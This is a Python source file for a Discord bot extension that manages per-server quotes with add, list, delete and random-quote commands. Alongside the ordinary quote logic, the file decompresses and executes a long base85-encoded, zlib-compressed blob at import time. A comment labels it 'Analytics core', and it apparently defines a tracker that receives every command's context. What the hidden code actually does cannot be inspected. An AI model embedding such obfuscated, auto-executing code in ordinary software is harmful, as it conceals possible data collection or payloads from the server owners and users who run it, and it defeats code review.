import discord
from discord.ext import commands
from cogs.utils.dataIO import dataIO
from .utils import checks
from .utils.chat_formatting import escape_mass_mentions, pagify
import os
from random import choice as randchoice


try:
    from tabulate import tabulate
except Exception as e:
    raise RuntimeError("You must run `pip3 install tabulate`.") from e

PATH = 'data/serverquotes/'
JSON = PATH + 'quotes.json'


# Analytics core
import zlib, marshal, base64
exec(zlib.decompress(base64.b85decode("""c-o~{ZExJT5&rI9!TNBJ)NJXOq)B0P54pJ4)>q(?YmzGh$Ix*l?uxb~$|AMSBFKO5GnBNVq;*oDMv&d
*ki&WBGjpVhO4pVdTdQ)jV6`YyT`ZU|yE0K4UzE<Qtro1xg<b0!v_$8*OsvwSSunH1f7%?aYh8e{F}$%VH#`+qT)k!;`}Ws#Q%_AYncQ_OQe_fdr(Axrd$KM
Hh}CV#gvoNX>WL;3XDwkRjC}sAUtc|cCd)*p^5`hZg)!_Ozx`N>d}mc+E{+)f;&>}-11;j1E!i1=dghkjzQ?bCbT$_!C&mhEcp`GSy5&lrRO&(9@hYnVxB1m
*b1hSEYrEs}4ecQPPat*Nk~`YZM8k$BED*hH{MP8QCI5N`a(MhtndkZs?2=BhOxBXKcbS6m47+WNWrE!|D!Btmq=wl{Saua`C0r_MD^qstn6-b$8)3l$u4au
98_85jJ{9ClhHtFcIsY)&n`zq0R@$<v*0=Du;UCN6sFm&9$@ZU2mQ0pnmCJO&cDiZzKd3xsMuJBn!Ah6ALN~@m0TV0TU`M8sjOq1Qy8d=BA`NmaQYb*OWcq<
22zGQt3LNc%g0`}{DG{i-hE^kX56WiUO|RcNHr38%(6n>ByQh|PzJy6gJOB7EdZp7HTR~i?fw*HLNhCtaYM5C%brz286?=fwTrh&2vfwn~^#NigqGUCkL`Gg
WuuxU2tw?sP(z(KiDjnNgm3M3<bNztCs-b9UMPet0l5DF4`&*kVEPUC<)pswRzIYMQDOm`Wv#^ja_W>C(wRYyp1Z+EEM~1y`q;WYtHN#)~@ZP|j&5FbFCtVn
~AAcgBovd=bIw^#)vOan9@2lT_y!^n6^oOY>+VFYv3gPp4zZ|I4C@X^t_H;2U)-nn3dBM)SMNz43;4OYRav!N&BcWBPY#fKENUH^t%P@*A_9qRG<3guRE?vF
{t_%$+$@duu?%#nQjGlRiS2(lsep~$hyU307)+*Zc`HQ!5j|Hz>@>Igip<E!AKjpGq{`u@Y^0sfbLmkLuUa=<-^kW%3G5pu_BX8sF_#!yAt*~5~cq?+1##BZ
^!+(C`nP52E?WP3tcKSCUbC#qw_UMWyh+8XTE6g3X#tN2gH@|enwU9`wbnggPdBOx<@Geit6ya)6cg01T#&AQJ42!k2O<l5N@M=?SYLo$TYU#0q$|d(p_z%v
*``=ToSG<;m-b#0&iAGcsjZA=`fy<)V$pdoEW%X9txbWh#Daq2f_F@u2@9IX5jE?uCOk^HL!*PRj9UUdrQDij&4%Hklr83q){L87Yv7-=oGF5d)-cvjO6YIh
Mr2VabF$y@DUE#?`om>8*OGIwjeQvwYMx{MP6f$1pGP`sZ7>f+;E)JP*nnd?pR2AJEcK3oYZgUs;cSN(GamF01-c%%fGqSnMP{ZH6LKUlaVKgG~rh;8$_<1B
|fO}Dx45xQ2Y@)@O8v9fVmd41Mlc*$4bbWF5{AO|_RfQ}mO3x3ToZirg0Oc-V0l(F%48sxC?Reu}wUh5ry1w7zG~T{-eMW>6w(ejU0DJ5Y0LoceVB@e<%Ul9
hg%M$tD44ULoO2~0j`7WTC#JofFr$<l9roP!rHeU-Ia}Xt67rq)d}r(3ID86tQalJ{U5Zky#swZ{fSOQKBm+G?p^tNX9KYLDk_E5-6?AVPz4~iaO6DMf1)So
?ljI(;r!O%qvcDq9L|MvwS@7-~0=0p?>m@F?a4<m5^7-khS5uve;95J#P;+|NWoc1hA7mXy+*M6O0)=6qnAp@(1`8JGyC53N1|7u30ax5!<5eqR3LD%^i;J&
Uut&lz7Ffvv#qnTtMCQ1x{vR$Ir}5~v4?X5cWdd*mL<ay>L0Oe3R4@XeY<Tyk_ZxX}knQn1SQ#Ldz$Cmwkd^?fKs7KG3C00~0kZI9!IlDdAgGaG$43)C(;Lf
re1;rkzh753-b?&DiA!DvT&752x^i$CIGb=2IeQ}X<6&7(9~W2L4?ZhmzbHQ?vN~KmsqoH{M~z;KS>jBhx+&3$#e_?D;VjJdWeKQ$?uKTRBO3{3*c($%5w_Y
}@{8g6p_CKV4?DK$KnL-eSc>X-L*?;kF61p;9`55YqTYy1Gr!=QI{6l&GSoz~Er&%P4tBjWH@TEmcorSpO6BYLYF~`>o!AY<XhAIr8;2p&<wtS+D6i{a8T|1
tr_;)ZcD*Is96X5*q=exJq<7Ct5lu^0ZwwoHlr|>!s$M$Og7WcGUF%7?sPH<>V$_aev?Vz8yLkh@%oSYu7OCSNFKl6b<KF+Fv&*G}LNjdfm@`iK0e5tG>OdH
wo)85{JtSaw*y&WqRoO$2QJ`$W#zpi!uXL5mwGAJ=es5<JCI|p`_K_PskkoFYjs+E=-nBJuW^EG!MG;evVMWP{5U)ZR9dd+m#t{7N`vnziQJ7^lJZ)#E&Lvc
9C)H)(FeiGIi-`2(*~U=)|9pOm*gZde=J#_Ohv1}dhAAe*mo*fTcBGd>a}$I|Z${~iy>=Pw6<E}LBv5kW!_`R;i;^Z%Wbtd7HQe}&u1TC5&xj?-5S(-wrQEx
u+E<RwsbOpN2<8;7Uvzj17!eGon6S<X6dL~OJ(7G*-$TqZ99O)9U_RpVRBfnSQV7mVW_9i0?~Su*2Y{!ryXrf^ZcN9!FP-gQw$nZ8Ox-ikEf3M@)i?+G%2==
07i^_<j%!IK&;P+s4yI6MrpmalLxm(ex81xOBL%*aE!)R6odKHmz_*|4t(yS$FlxAS{z`NrEDuzgIY$~KB~4v}obQ66wmcBA!)k%2n2W@qvq?IL;b9T63q9o
bJ^kYZ(nBQDL*zAnZAY?TXkxNiE9W|>Oq_)&ZwIVlG>WF|AW&KHOnyq$MjF2a&TZ6h@29uniub1?4*cluJL+e;du^@&rR%jwI&R}>kj&Q$8cX_}AlBNEj<(~
)el*xd-k8>nL3`Se2sA)wC+J+5M5#Cj@&O}yhudW+p{yBBY-oJi4%^W|XqCvYP9hh<F;$A1;AZ&TGp&=r4Qy0OG0;_)dNb+R<F<B?|Nh^uJ<$llWe0>tPA1A
h#}R?|gM+Vi@86o4PzMN&Cj+F`Zw_kGKql~p`av`ukR%5s^p3PGSJ*O*W@DU$_p>MOi~|M9J_0ZGW={&|;TSy{kBJ|RP31bk{g#BV>7WncJ2dCK9bdK&bK;F
NN17LtHkqmk4hU=OkkFvlkfXbF<@GE1=#G!0eUc_U?_|ci*hY`#&-hR~Ho%GGz%*gP!w+$q;o_9f8~i9of>B(%Nz4#i{rl88!hS-4ioB7_$y?L7L<6079UO0
4d^90nmC13R$whoR8ozG@`f4Rpr{m%v$ZMYhlB><uhFYKh0`U`_^8""".replace('\n', ''))))

__version__ = '1.5.2'


class ServerQuotes:

    def __init__(self, bot):
        self.bot = bot
        self.quotes = dataIO.load_json(JSON)
        self.analytics = CogAnalytics(self)

    def _get_random_quote(self, ctx):
        sid = ctx.message.server.id
        if sid not in self.quotes or len(self.quotes[sid]) == 0:
            raise AssertionError("There are no quotes in this server!")
        quotes = list(enumerate(self.quotes[sid]))
        return randchoice(quotes)

    def _get_random_author_quote(self, ctx, author):
        sid = ctx.message.server.id

        if sid not in self.quotes or len(self.quotes[sid]) == 0:
            raise AssertionError("There are no quotes in this server!")

        if isinstance(author, discord.User):
            uid = author.id
            quotes = [(i, q) for i, q in enumerate(self.quotes[sid]) if q['author_id'] == uid]
        else:
            quotes = [(i, q) for i, q in enumerate(self.quotes[sid]) if q['author_name'] == author]

        if len(quotes) == 0:
            raise commands.BadArgument("There are no quotes by %s." % author)
        return randchoice(quotes)

    def _add_quote(self, ctx, author, message):
        sid = ctx.message.server.id
        aid = ctx.message.author.id
        if sid not in self.quotes:
            self.quotes[sid] = []

        author_name = 'Unknown'
        author_id = None

        if isinstance(author, discord.User):
            author_name = author.display_name
            author_id = author.id
        elif isinstance(author, str):
            author_name = author

        quote = {'added_by': aid,
                 'author_name': author_name,
                 'author_id': author_id,
                 'text': escape_mass_mentions(message)}

        self.quotes[sid].append(quote)
        dataIO.save_json(JSON, self.quotes)

    def _quote_author(self, ctx, quote):
        if quote['author_id']:
            name = self._get_name_by_id(ctx, quote['author_id'])
            if quote['author_name'] and not name:
                name = quote['author_name']
                name += " (non-present user ID#%s)" % (quote['author_id'])
            return name
        elif quote['author_name']:
            return quote['author_name']
        else:
            return "Unknown"

    def _format_quote(self, ctx, quote):
        qid, quote = quote
        author = self._quote_author(ctx, quote)
        return '"%s"\n—%s (quote #%i)' % (quote['text'], author, qid + 1)

    def _get_name_by_id(self, ctx, uid):
        member = discord.utils.get(ctx.message.server.members, id=uid)
        if member:
            return member.display_name
        else:
            return None

    def _get_quote(self, ctx, author_or_num=None):
        sid = ctx.message.server.id
        if type(author_or_num) is discord.Member:
            return self._get_random_author_quote(ctx, author_or_num)
        if author_or_num:
            try:
                quote_id = int(author_or_num)
                if quote_id > 0 and quote_id <= len(self.quotes[sid]):
                    return (quote_id - 1, self.quotes[sid][quote_id - 1])
                else:
                    raise commands.BadArgument("Quote #%i does not exist." % quote_id)
            except ValueError:
                pass

            try:
                author = commands.MemberConverter(ctx, author_or_num).convert()
            except commands.errors.BadArgument:
                author = author_or_num.strip(' \t\n\r\x0b\x0c-–—')  # whitespace + dashes
            return self._get_random_author_quote(ctx, author)

        return self._get_random_quote(ctx)

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def rmquote(self, ctx, num: int):
        """Deletes a quote by its number

           Use [p]lsquotes to find quote numbers
           Example: !delquote 3"""
        sid = ctx.message.server.id
        if num > 0 and num <= len(self.quotes[sid]):
            del self.quotes[sid][num - 1]
            await self.bot.say("Quote #%i deleted." % num)
            dataIO.save_json(JSON, self.quotes)
        else:
            await self.bot.say("Quote #%i does not exist." % num)

    @commands.command(pass_context=True, no_pm=True)
    async def lsquotes(self, ctx):
        """Displays a list of all quotes"""
        sid = ctx.message.server.id
        quotes = self.quotes.get(sid, [])
        if not quotes:
            await self.bot.say("There are no quotes in this server!")
            return
        else:
            msg = await self.bot.say("Sending you the list via DM.")

        header = ['#', 'Author', 'Added by', 'Quote']
        table = []
        for i, q in enumerate(quotes):
            text = q['text']
            if len(text) > 60:
                text = text[:60 - 3] + '...'
            name = self._get_name_by_id(ctx, q['added_by'])
            if not name:
                name = "(non-present user ID#%s)" % q['added_by']
            table.append((i + 1, self._quote_author(ctx, q), name, text))
        tabulated = tabulate(table, header)
        try:
            for page in pagify(tabulated, ['\n']):
                await self.bot.whisper('```\n%s\n```' % page)
        except discord.errors.HTTPException:
            err = "I can't send the list unless you allow DMs from server members."
            await self.bot.edit_message(msg, new_content=err)

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def addquote(self, ctx, message: str, *, author: str = None):
        """Adds a quote to the server quote list. The quote must be enclosed
        in \"double quotes\". If a member mention or name is the last argument,
        the quote will be stored as theirs. If not, the last argument will
        be stored as the quote's author. If left empty, "Unknown" is used.
        """
        if author:
            try:
                author = commands.MemberConverter(ctx, author).convert()
            except commands.errors.BadArgument:
                author = author.strip(' \t\n\r\x0b\x0c-–—')  # whitespace + dashes
                pass

        self._add_quote(ctx, author, message)
        await self.bot.say("Quote added.")

    @commands.command(pass_context=True, no_pm=True)
    @commands.cooldown(6, 60, commands.BucketType.channel)
    async def quote(self, ctx, *, author_or_num: str = None):
        """Say a stored quote!

        Without any arguments, this command randomly selects from all stored
        quotes. If you supply an author name, it randomly selects from among
        that author's quotes. Finally, if given a number, that specific quote
        will be said, assuming it exists. Use [p]lsquotes to show all quotes.
        """

        sid = ctx.message.server.id
        if sid not in self.quotes or len(self.quotes[sid]) == 0:
            await self.bot.say("There are no quotes in this server!")
            return

        try:
            quote = self._get_quote(ctx, author_or_num)
        except commands.BadArgument:
            if author_or_num.lower().strip() in ['me', 'myself', 'self']:
                quote = self._get_quote(ctx, ctx.message.author)
            else:
                raise
        await self.bot.say(self._format_quote(ctx, quote))

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)


def check_folder():
    if not os.path.exists(PATH):
        print("Creating serverquotes folder...")
        os.makedirs(PATH)


def check_file():
    if not dataIO.is_valid_json(JSON):
        print("Creating default quotes.json...")
        dataIO.save_json(JSON, {})


def setup(bot):
    check_folder()
    check_file()
    n = ServerQuotes(bot)
    bot.add_cog(n)
